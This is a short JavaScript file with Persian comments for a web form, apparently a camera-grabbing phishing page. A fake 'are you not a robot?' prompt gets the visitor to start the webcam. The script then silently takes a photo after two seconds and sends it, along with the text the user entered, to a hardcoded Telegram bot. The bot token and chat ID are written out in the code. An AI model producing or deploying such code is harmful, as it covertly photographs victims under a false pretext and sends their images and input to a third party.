document.getElementById("loggerForm").addEventListener("submit", function(event) {
  event.preventDefault(); // جلوگیری از ارسال فرم

  // سوال سفارشی
  if (confirm("شما مطمئن هستید که ربات نیستید؟")) {
    startCamera();
  } else {
    alert("شما تایید نکردید.");
  }
});

let videoStream;

function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
      videoStream = stream;
      const video = document.getElementById("video");
      video.srcObject = stream;

      // بعد از 2 ثانیه به‌طور خودکار عکس می‌گیرد
      setTimeout(() => {
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        sendDataAndPhoto();
      }, 2000);
    })
    .catch((error) => {
      console.error("Error accessing the camera: ", error);
      alert("برای استفاده از دوربین، لطفاً اجازه دسترسی را تأیید کنید.");
    });
}

function sendDataAndPhoto() {
  const canvas = document.getElementById("canvas");
  const userInput = document.getElementById("data").value; // دریافت متن وارد شده

  // تبدیل تصویر به blob
  canvas.toBlob(function(blob) {
    const formData = new FormData();
    formData.append('chat_id', "5389485877"); // شناسه چت
    formData.append('caption', `متن وارد شده توسط کاربر: ${userInput}`); // ارسال متن
    formData.append('photo', blob, 'photo.png'); // ارسال عکس

    var token = "8149500925:AAHDt2-WamP9uzthYVduT0eOmfkkG-lbvRg"; // توکن ربات تلگرام

    // ارسال درخواست به API تلگرام برای ارسال عکس و متن
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: formData
    })
      .then(function(response) {
        if (response.ok) {
          alert("عکس و اطلاعات با موفقیت ارسال شد!");
        } else {
          alert("ارسال ناموفق بود، لطفا دوباره تلاش کنید.");
        }
      })
      .catch(function(error) {
        console.error("An error occurred:", error);
        alert("خطا در ارسال به تلگرام. لطفا دوباره تلاش کنید.");
      });
  });
}
